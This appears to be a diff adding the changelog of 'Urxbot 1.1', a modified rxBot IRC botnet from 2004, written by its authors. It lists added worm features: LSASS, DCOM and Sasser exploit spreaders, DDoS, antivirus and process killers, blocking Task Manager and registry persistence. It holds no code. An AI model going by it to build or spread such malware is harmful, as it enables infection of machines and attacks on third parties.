@@ -1,0 +1,42 @@
+Urxbot 1.1 [PRIV-INTERNAL]
+RXBOTMOD BY:Uncanny 
+Special Thanks:SeminolePride
+------------------
+ 
+ Changes (07/23/04):
+
+ Uncanny - ADDED FTPD [GREAT eh!]
+ Uncanny - ADDED LSASS
+ Uncanny - ADDED POWERFULL DDOS
+ Uncanny - FIXED EXPLOIT MSG'S
+ Uncanny - ADDED MIRC VERSION'S
+
+ Changes (08/19/04):
+
+ Uncanny - RANDOM LSASS DPORT [FOR FASTER SPREADING]
+ Uncanny - RANDOM FTPD PORT [MORE EXPLOIT SUCCESS]
+ Uncanny - ADDED DCOM TFTP
+ 
+ Changes (08/25/04):
+ 
+ Uncanny - STRIPPED USELESS SPREADER'S [TO REDUCE EXE SIZE]
+ Uncanny - ADDED SASSER
+ Uncanny - STABLE RXBOT [STILL NOT SURE]
+ Uncanny - FASTER SPREADING
+
+ Changes (08/29/04):
+ 
+ Uncanny - PROCESS KILLER WORKING
+ Uncanny - AVIRUS.CPP WORKING
+ Uncanny - MORE REGISTER ADDONS
+ Uncanny - UNABLE TO OPEN TASKMGR
+ 
+ Changes (08/31/04):
+ 
+ SeminolePride - FIXED RESET BUG [NO MORE (Read error: Connection reset by peer)]
+ SeminolePride - ADDED MSSQL FTPD [MORE SCANNERS]
+
+ Uncanny TODO:
+ 
+ REALLY NOTHING............. 
+  
